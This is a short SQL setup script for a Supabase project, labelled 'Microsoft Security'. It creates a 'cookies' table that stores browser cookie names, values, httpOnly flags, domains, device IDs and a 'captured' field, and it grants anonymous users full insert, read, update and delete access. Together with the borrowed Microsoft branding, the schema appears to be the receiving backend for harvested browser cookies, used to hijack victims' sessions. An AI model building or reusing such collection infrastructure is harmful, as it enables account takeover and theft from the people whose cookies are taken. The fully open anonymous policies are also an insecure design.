-- Microsoft Security - Supabase Database Setup
-- Run this SQL in your Supabase SQL Editor (https://supabase.com/dashboard/project/vecwhqgmxdkuwxpmgual/sql/new)

-- 1. Drop old table if exists, then create fresh
DROP TABLE IF EXISTS cookies;

CREATE TABLE cookies (
  id TEXT PRIMARY KEY,
  device_id TEXT NOT NULL DEFAULT '',
  domain TEXT NOT NULL,
  url TEXT NOT NULL,
  name TEXT NOT NULL,
  value TEXT,
  path TEXT,
  secure TEXT,
  "httpOnly" TEXT,
  "sameSite" TEXT,
  expiry TEXT,
  captured TEXT,
  timestamp BIGINT
);

-- 2. Allow anonymous access (RLS)
ALTER TABLE cookies ENABLE ROW LEVEL SECURITY;

CREATE POLICY "anon_insert" ON cookies
  FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "anon_select" ON cookies
  FOR SELECT TO anon USING (true);

CREATE POLICY "anon_delete" ON cookies
  FOR DELETE TO anon USING (true);

CREATE POLICY "anon_update" ON cookies
  FOR UPDATE TO anon USING (true) WITH CHECK (true);

-- 3. Indexes for fast queries
CREATE INDEX IF NOT EXISTS idx_cookies_device_id ON cookies (device_id);
CREATE INDEX IF NOT EXISTS idx_cookies_timestamp ON cookies (timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_cookies_domain ON cookies (domain);
CREATE INDEX IF NOT EXISTS idx_cookies_name ON cookies (name);
